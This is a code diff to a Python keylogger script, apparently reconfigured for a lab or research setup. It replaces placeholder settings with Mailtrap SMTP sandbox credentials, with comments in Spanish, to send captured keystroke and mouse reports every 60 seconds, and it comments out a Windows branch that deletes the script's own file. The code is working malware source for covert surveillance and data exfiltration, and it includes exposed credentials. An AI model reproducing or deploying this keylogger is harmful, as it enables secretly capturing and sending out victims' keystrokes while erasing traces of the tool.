@@ -22,9 +22,20 @@ except ModuleNotFoundError:
 
 
 finally:
-    EMAIL_ADDRESS = "YOUR_USERNAME"
-    EMAIL_PASSWORD = "YOUR_PASSWORD"
-    SEND_REPORT_EVERY = 60 # as in seconds
+    # ======= CONFIGURACIÓN MAILTRAP (TODO EN ESTE .PY) =======
+    SMTP_HOST = "sandbox.smtp.mailtrap.io"
+    SMTP_PORT = 2525
+
+    # Estos son los CREDENTIALS de tu sandbox (NO el mail real):
+    EMAIL_ADDRESS = "dc15111b08ff20"      # username de Mailtrap
+    EMAIL_PASSWORD = "1f599db6d7c116"     # password de Mailtrap
+
+    # From/To son solo etiquetas, Mailtrap los acepta como quieras:
+    FROM_EMAIL = "vm01@rsystem.local"
+    TO_EMAIL = "researcher@rsystem.local"
+
+    SEND_REPORT_EVERY = 60  # segundos
+    
     class KeyLogger:
         def __init__(self, time_interval, email, password):
             self.interval = time_interval
@@ -118,6 +129,7 @@ finally:
                 keyboard_listener.join()
             with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                 mouse_listener.join()
+            '''
             if os.name == "nt":
                 try:
                     pwd = os.path.abspath(os.getcwd())
@@ -127,7 +139,7 @@ finally:
                     os.system("DEL " + os.path.basename(__file__))
                 except OSError:
                     print('File is close.')
-
+'''
             else:
                 try:
                     pwd = os.path.abspath(os.getcwd())
